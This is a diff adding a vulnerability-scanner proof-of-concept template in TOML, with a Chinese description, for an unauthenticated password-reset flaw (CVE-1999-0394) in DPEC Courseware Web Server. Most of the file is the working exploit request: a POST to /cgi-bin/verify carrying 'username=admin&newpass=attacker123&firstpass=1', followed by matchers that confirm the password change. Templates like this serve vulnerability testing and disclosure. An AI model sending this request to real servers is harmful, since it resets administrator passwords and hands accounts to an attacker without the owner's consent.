@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = "DPEC Online Courseware 在密码验证页面中存在隐藏字段 firstpass，攻击者通过 POST 请求提交该字段可绕过原密码验证，直接修改任意用户（含管理员）的密码。该漏洞影响 DPEC Courseware Web Server，无需身份认证即可远程利用。"
+id = "POC-AVE-1999-0632"
+name = "DPEC Courseware Web Server 任意用户密码修改漏洞 PoC"
+severity = "critical"
+tags = ["ave-1999-0632"]
+vuln_id = [
+    "CVE-1999-0394",
+    "AVE-1999-0632",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/verify"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin&newpass=attacker123&firstpass=1"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Password changed",
+    "success",
+    "verified",
+]
